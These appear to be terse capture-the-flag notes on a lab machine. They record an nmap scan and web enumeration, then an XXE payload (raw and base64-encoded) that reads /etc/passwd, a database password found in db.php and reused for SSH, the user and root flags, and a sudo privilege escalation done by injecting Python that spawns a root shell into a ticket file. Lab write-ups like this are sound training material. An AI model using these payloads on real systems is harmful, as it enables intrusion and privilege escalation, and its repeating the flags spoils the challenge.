Nmap scan report for 10.10.11.100
Host is up (0.037s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
http-server-header: Apache/2.4.41 (Ubuntu)
http-title: Bounty Hunters
- Apache 2.4.41
- Bootstrap 4.5.3
- jQuery 3.5.1 
/resources/README.txt:
- May be test account, unhashed passwords, and nopass.
- Tracker submit script not connected to DB
/resources/bountylog.js:
- tracker_diRbPr00f314.php
	- Data set is `data={}`, with `{}` in the following format (url and b64):
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>title</title>
		<cwe>cwe</cwe>
		<cvss>cvss</cvss>
		<reward>reward</reward>
		</bugreport>
```
- XML XXE?
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]>
<bugreport>	
<title>&xxe;</title>	
<cwe>test</cwe>	
<cvss>test</cvss>
<reward>test</reward>	
</bugreport>
```
```
D94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vZXRjL3Bhc3N3ZCI%2BIF0%2BCjxidWdyZXBvcnQ%2BCQo8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgkKPGN3ZT50ZXN0PC9jd2U%2BCQo8Y3Zzcz50ZXN0PC9jdnNzPgo8cmV3YXJkPnRlc3Q8L3Jld2FyZD4JCjwvYnVncmVwb3J0Pg%3D%3D
```

/db.php:
- Empty, but very interesting.
```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

development:m19RoAU0hP41A1sTsq6K

ssh'd in

user.txt:
722c3f2e3b3a776824542a2c4b5c218d

sudo -l:
python3 /opt/skytrain_inc/ticketValidator.py

Create file.md
```
# Skytrain Inc
## Ticket to sudo
__Ticket Code:__
** 123 + 10 == 133 and __import__("pty").spawn("/bin/bash")
```
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

root.txt:
7eaa083b300e1888cc8d4171e722d3d3
